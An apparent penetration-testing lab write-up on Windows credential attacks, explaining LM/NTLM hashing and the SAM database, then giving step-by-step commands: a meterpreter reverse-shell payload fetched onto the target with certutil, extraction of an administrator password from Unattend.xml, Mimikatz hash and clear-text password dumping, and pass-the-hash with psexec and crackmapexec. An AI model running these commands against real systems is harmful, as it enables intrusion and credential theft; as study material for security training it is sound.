
---
## Windows Password Hashes

The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.

Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).

Windows versions up to Windows server 2003 utilize two different types of hashes:
- **LM**
- **NTLM** 

Windows disabled LM hashing and utilized NTLM hashing from Vista onwards.

### SAM (Security Account Manager) Database

SAM is the database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.

The SAM database file cannot be copied while the operating system is running.

The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.

In modern versions of Windows, the SAM database is encrypted in syskey.

**Note: Elevated Administrative privileges are required in order to access and interact with the LSASS process .**

### LM (LanMan)

LM is the default hashing algorithm that was implemented by Windows OS prior to NT 4.0.

The algorithm is used to hash user passwords, and the hashing process can be broken down into the following steps:
- The password is broken into two seven-character chunks.
- All characters are then converted into uppercase.
- Each chunk is then hashed separately with the DES algorithm.

LM hashing is generally considered to be a weak protocol and can be easily cracked, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes.

### NTLM 

NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.

From Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing.

When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.

NTLM improves upon LM in the following ways:
- Does not split the hash into two chunks.
- Case sensitive
- Allows the user of symbols and unicode characters.

---

## Searching For Passwords In Windows Configuration Files


Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.

This is typically done through the use of the Unattended Windows Setup utility, which is used to automate the mass installation/deployment of Windows on systems.

This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password.

If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target. 

The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system info:
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Autounattendxml

The password stored in the Unattended Windows Setup configuration file may be encoded in base64.

In this particular Lab, we have access directly to the target machine.

We will create a msf venom payload for a 64bit system:`msfvenom -p windows/x64/meterpreter/reverse_tcp -LHOST=(our IP address) LPORT=(port number) -f exe > (filename).exe`

After that, we will host a simple http server on our machine running on port 80 using python:`python3 -m http.server 80` 

Now, we switch to our target machine and we open a cmd window and we type:`certutil -urlcache -f http://(our IP)/payload.exe payload.exe`

This will upload the file we created: "payload.exe" to a file under the same name.

Now, we will run msf and use multi/handler and set the payload the same as the payload in msfvenom with the same options for LPORT and LHOST.

We run the exploit in msf, then we switch back to the target machine and we execute the payload file.

Now, we have a meterpreter session in msf.

Once, we have a meterpreter session, we can search for the Unattend.xml file:`search -f unattend.xml`
We will get 3 matches. We are interested in the one under "Panther" directory.

We download it:`download (path to file)`

After viewing its content on our local machine, we will see the password encoded using base64 along side with the username of the administrator account. We can reverse this encoding using the online tool "cyberchef ".
The password is:"Admin@123

We will use psexec.py to login as an administrator: `python3 ./psexec.py (username):(password)@(target IP)`

We are logged in as Administrator.

---

## Dumping Hashes with Mimikatz

Mimikatz allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.

Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.

**We can utilize the pre-compiled Mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi**

**Note: Mimikatz require elevated privileges to run correctly**.

After having a meterpreter session with elevated privileges, we can load the Kiwi module and type help to get the commands that we can use. To dump the SAM database using Kiwi:`lsa_dump_sam`
**Note: Kiwi must run in a SYSTEM process**

Alternatively, we can upload mimikatz.exe to the target host and executed it there.

After executing the Mimikatz file, we can dump SAM database by:`lsadump::sam`

Some Windows machines are configured to store logon passwords in clear text and we can use Mimikatz to show us that:`sekurlsa::logonpasswords`

---

## Pass-The-Hash Attacks

Pass-The-Hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target.

We can use multiple tools to facilitate a Pass-The-Hash attack:
- Metasploit PsExec module (exploit/windows/smb/psexec)
- Crackmapexec

This technique will allow us to obtain access to the target system via valid credentials as opposed to obtaining access via service exploitation.

**The PsExec module can be used by setting the SMB_Pass option with the NTLM and the LM hash, and the SMB_User with the username.** 

**We get the NTLM and the LM hash from lsass.exe process and using the command `hashdump`**
The NTLM and LM hash will be in the format of: (LMHash:NTLMHash)
like so: aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d


We can also use crackmapexec tool to execute malicious commands. However, the tool uses only the NTLM hash:`crackmapexec smb (target IP) -u (username) -H "(NTLM Hash)" -x "(commands)"`